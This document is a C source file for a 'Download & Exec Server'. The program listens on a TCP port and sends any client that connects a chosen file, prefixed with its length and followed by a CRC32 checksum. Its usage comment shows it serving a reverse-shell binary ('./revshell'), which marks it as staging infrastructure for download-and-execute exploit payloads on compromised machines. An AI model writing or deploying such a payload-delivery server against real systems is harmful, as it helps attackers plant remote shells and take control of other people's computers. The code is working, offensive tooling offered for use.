/*
 *
 * Download & Exec Server
 * ./serve 8000 ./revshell
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <arpa/inet.h>

#define CRCPOLY_LE 0xedb88320

/**
 * crc32_le() - Calculate bitwise little-endian Ethernet AUTODIN II CRC32
 * @crc: seed value for computation.  ~0 for Ethernet, sometimes 0 for
 *	other uses, or the previous crc32 value if computing incrementally.
 * @p: pointer to buffer over which CRC is run
 * @len: length of buffer @p
 *
 * In fact, the table-based code will work in this case, but it can be
 * simplified by inlining the table in ?: form.
 */

unsigned int crc32_le ( unsigned int crc, unsigned char const *p, size_t len )
{
	int i;
	while ( len-- ) {
		crc ^= *p++;
		for ( i = 0; i < 8; i++ )
			crc = (crc >> 1) ^ ((crc & 1) ? CRCPOLY_LE : 0);
	}
	return crc;
}

int main ( int argc, char **argv )
{
    int fd, sockfd, port, result, bytes_read, bytes_written, bytes_out;
    unsigned int size, crc32_calc = 0;
    char *endptr, ip_addr[INET_ADDRSTRLEN], buf[1024];
    struct sockaddr_in sin, cin;
    socklen_t cin_size = sizeof(cin);

    if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 )
    {
        printf("Error creating socket.\n");
        return 1;
    }

    port = strtol(argv[1], &endptr, 0);
    if ( *endptr )
    {
        printf("Invalid port number.\n");
        return 1;
    }

    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = htonl(INADDR_ANY);
    sin.sin_port = htons(port);

    printf("Bound to port %d, waiting for connection...\n", port);

    if ( bind(sockfd, (struct sockaddr *)&sin, sizeof(sin)) < 0 )
    {
        printf("Error binding to port.\n");
        return 1;
    }

    if ( listen(sockfd, 1) < 0 )
    {
        printf("Error listening for connections.\n");
        return 1;
    }

    while ( 1 )
    {
        if ( (result = accept(sockfd, (struct sockaddr *)&cin, &cin_size)) < 0 )
        {
            printf("Error accepting new connection.\n");
            return 1;
        }

        inet_ntop(AF_INET, &cin.sin_addr, ip_addr, cin_size);

        printf("Received connection from %s, serving file.\n", ip_addr);

        if ( fork() == 0 )
        {
            if ( (fd = open(argv[2], O_RDONLY, 0)) < 0 )
            {
                printf("Error opening file.\n");
                return 1;
            }

            lseek(fd, 0, SEEK_END);
            size = lseek(fd, 0, SEEK_CUR);
            lseek(fd, 0, SEEK_SET);

            write(result, &size, 4);

            while ( 1 )
            {
                bytes_read = read(fd, buf, sizeof(buf));

                if ( bytes_read == 0 )
                    break;
                else if ( bytes_read < 0 )
                {
                    printf("Error reading from file.\n");
                    return 1;
                }

                bytes_out = 0;

                while ( bytes_read )
                {
                    bytes_written = write(result, buf + bytes_out, bytes_read);

                    if ( bytes_written < 0 )
                    {
                        printf("Error writing to socket.\n");
                        return 1;
                    }

                    crc32_calc = crc32_le(crc32_calc, buf + bytes_out, bytes_written);

                    bytes_read -= bytes_written;
                    bytes_out  += bytes_written;
                }
            }

            write(result, &crc32_calc, 4);

            close(fd);

            return 0;
        }
        else
            close(result);
    }

    return 0;
}
